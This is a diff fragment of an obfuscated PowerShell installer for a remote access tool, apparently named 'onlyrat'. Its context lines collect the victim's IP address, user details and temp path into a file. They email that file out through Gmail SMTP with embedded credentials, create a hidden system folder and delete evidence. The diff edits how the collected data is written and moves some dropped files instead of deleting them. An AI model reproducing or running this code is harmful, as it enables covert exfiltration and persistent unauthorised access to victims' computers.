@@ -35,7 +35,7 @@ $AhdjktGyiZ = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IP
 Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ
 Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP
 Add-Content -Path $CRYnrkaDbe -Value $env:temp
-Add-Content -Path $CRYnrkaDbe -Value "$NyZnoLKCIs"
+Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs
 Send-MailMessage -From $oNumpPlFnH -To $oNumpPlFnH -Subject $CRYnrkaDbe -Attachment $CRYnrkaDbe -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $oNumpPlFnH, (ConvertTo-SecureString -String $XpKqtwxTVC -AsPlainText -Force))
 mkdir $qsQBioVOkY
 Set-Location $qsQBioVOkY
@@ -51,6 +51,6 @@ Set-Location C:\Users
 attrib +h +s +r onlyrat 
 Set-Location $NyZnoLKCIs
 Remove-Item $CRYnrkaDbe
-Remove-Item XbrMzmCUiE.txt
-Remove-Item UJbMLjTIDr.txt
+Move-Item XbrMzmCUiE.txt $env:temp
+Move-Item UJbMLjTIDr.txt $env:temp
 Remove-Item KFPGaEYdcz.ps1
